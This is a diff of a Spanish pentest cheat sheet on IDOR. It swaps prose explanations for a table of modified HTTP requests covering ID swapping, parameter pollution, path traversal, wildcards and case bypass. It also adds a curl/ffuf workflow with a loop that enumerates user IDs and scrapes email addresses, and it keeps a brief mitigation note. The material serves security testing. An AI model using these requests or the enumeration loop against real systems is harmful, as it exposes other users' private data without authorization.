@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/idor
   - technique/discovery
   - asset/api
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[BOLA - IDOR]]"
+  - '[[BOLA - IDOR]]'
 ---
 # IDOR - Manipulación de Parámetros y Rutas
 
@@ -19,29 +19,43 @@ linked:
 
 ## Cheatsheet
 
-| **Técnica**                                | **Descripción**                                                                                                                                                                              | **Request Original (Ejemplo)**           | **Request Modificado (Ejemplo)**                 |
-| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- | ------------------------------------------------ |
-| <br>**Cambio de ID Secuencial**            | <br>Alteración directa de un valor predecible en el parámetro de la URL.<br><br>                                                                                                             | <br>`GET /profile?user_id=105`<br><br>   | <br>`GET /profile?user_id=106`                   |
-| <br>**Parameter Pollution (HPP)**          | <br>Inyección de múltiples parámetros con el mismo nombre. El backend puede validar el primero pero procesar el segundo. Relacionado con [[HTTP Parameter Pollution]].<br><br>               | <br><br>`GET /api/messages?id=105`       | <br><br>`GET /api/messages?id=105&id=106`        |
-| <br><br>**Array Injection**                | <br>Modificación del parámetro para que sea interpretado como una matriz, lo que a menudo provoca fallos o derivaciones en la lógica de validación.<br><br>                                  | <br><br>`GET /view?doc=105`              | <br><br>`GET /view?doc[]=105&doc[]=106`          |
-| <br>**Manipulación de Rutas REST**         | <br>Sustitución del ID directamente en el _path_ de la URL cuando la arquitectura es RESTful.<br><br>                                                                                        | <br>`GET /api/v1/users/105/data`<br><br> | <br>`GET /api/v1/users/106/data`                 |
-| <br>**Path Traversal combinado**           | <br>Uso de secuencias de salto de directorio para escapar del contexto del usuario actual y alcanzar el _path_ de otros IDs. Relacionado con [[Path Traversal]]<br><br>                      | <br>`GET /api/users/105/profile`         | <br>`GET /api/users/105/../../users/106/profile` |
-| <br>**Inyección de Wildcards**             | <br>Uso de comodines (`*`, `%`) en los parámetros para forzar a la base de datos a devolver todos los registros o comportarse de manera inesperada.<br><br>                                  | <br><br>`GET /report?id=105`             | <br><br>`GET /report?id=*` (o `id=%`)            |
-| <br>**Bypass por Extensión**               | <br>Alteración de la extensión del endpoint. A veces las reglas de autorización del framework se aplican a `.html` o al _path_ base, pero ignoran `.json` o `.xml`.<br><br>                  | <br><br>`GET /users/105.html`            | <br><br>`GET /users/106.json`                    |
-| <br><br>**Alteración de Case Sensitivity** | <br>Cambio de mayúsculas a minúsculas en el nombre del parámetro. Útil si el [[WAF]] filtra identificadores específicos, pero el backend los procesa sin importar la capitalización.<br><br> | <br><br>`GET /account?id=105`            | <br><br>`GET /account?Id=106` o `ID=106`         |
-| <br>**Encapsulamiento JSON en GET**        | <br>Si el servidor acepta el _payload_ en texto crudo o formato JSON en lugar del parámetro estándar.<br><br>                                                                                | <br>`GET /data?id=105`                   | <br>`GET /data?id={"id":106}`<br><br>            |
+| **Request** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `GET /profile?user_id=106` | Perfil de otro usuario (ID secuencial) | IDs enteros predecibles. |
+| `GET /api/v1/users/106/data` | Datos del usuario 106 vía path RESTful | Path con ID en URL segments. |
+| `GET /api/messages?id=105&id=106` | HTTP Parameter Pollution — backend procesa segundo `id` mientras valida el primero | Discrepancia parser proxy vs backend. |
+| `GET /view?doc[]=105&doc[]=106` | Array injection — múltiples docs en una request | Backend bypasea validación de "doc único". |
+| `GET /api/users/105/../../users/106/profile` | Path traversal en estructura RESTful | Routing laxo que normaliza `..` después de autz. |
+| `GET /report?id=*` o `GET /report?id=%` | Wildcard en DB query → dump completo | Backend pasa `id` directo a SQL `LIKE`. |
+| `GET /users/106.json` | Bypass de autz que aplica solo a `.html` | Framework filtra extensión-base, no .json/.xml. |
+| `GET /account?Id=106` o `GET /account?ID=106` | Case bypass en nombre del param | WAF filtra `id` lowercase, backend acepta cualquier case. |
+| `GET /data?id={"id":106}` | JSON embebido en value de param GET | Backend acepta payload mixto. |
+| `GET /api/users/105;id=106` | Matrix parameter injection | Backend con parsing matrix-style (Java/Spring). |
+| `GET /api/users/-1` o `GET /api/users/0` | Edge IDs revelan usuario admin / system | Cuentas system con IDs negativos/cero. |
 ^idor-parametros
 
-## Estrategias de Evaluación y Testing
+### Workflow
 
-Para aplicar estas técnicas de manera sistemática durante una auditoría o en la construcción de modelos de amenazas para la arquitectura de [[API Security]]:
-- Interceptar y mapear todos los endpoints que reciben un identificador. Esto aplica tanto para enteros secuenciales, como para hashes débiles o un [[UUID]] mal implementado.
-- Probar el acceso a un objeto utilizando siempre una matriz de control de acceso: registrar las respuestas con dos sesiones de usuario diferentes (Usuario A y Usuario B) interactuando con objetos cruzados.
-- Analizar cómo se comporta el backend frente a tipos de datos atípicos o manipulados. Por ejemplo, enviar un _string_ donde se espera un _integer_, o enviar identificadores negativos y en cero como `id=-1` o `id=0`.
+```bash
+# 1. Capturar request original en Burp con sesión Usuario A
+# 2. Loguearse como Usuario B en otro browser → capturar IDs propios
+# 3. Probar swap manual en Repeater
+curl -H 'Cookie: session=USER_A_COOKIE' "https://target/profile?user_id=106"
 
-### Principios de Mitigación
+# 4. HPP automático en burp/ffuf
+ffuf -w ids.txt -u "https://target/profile?user_id=105&user_id=FUZZ" \
+     -H 'Cookie: session=USER_A_COOKIE' \
+     -mr 'Usuario B\|email_de_B'
 
-La solución definitiva a estos vectores de ataque no reside en la ofuscación de las rutas de la API, sino en la implementación estructural de un sistema de [[Control de Acceso Basado en Roles]] (RBAC) o basado en Atributos (ABAC). Siempre se debe evaluar, a nivel del modelo o del controlador, que el usuario autenticado (extraído del token de sesión, no de la petición del cliente) posee permisos de lectura, escritura o eliminación sobre el objeto específico que está solicitando.
+# 5. Iterar IDs secuenciales para enumeration masiva
+for i in $(seq 1 1000); do
+  RES=$(curl -s -H 'Cookie: session=USER_A' "https://target/profile?user_id=$i" | grep -oE 'email":"[^"]+')
+  echo "$i: $RES"
+done
+```
 
+### Mitigación
+
+Validación de autorización a nivel modelo: el usuario autenticado (del token, no del request) debe tener permiso explícito sobre el objeto referenciado. RBAC/ABAC > ofuscar IDs.
 
 ***
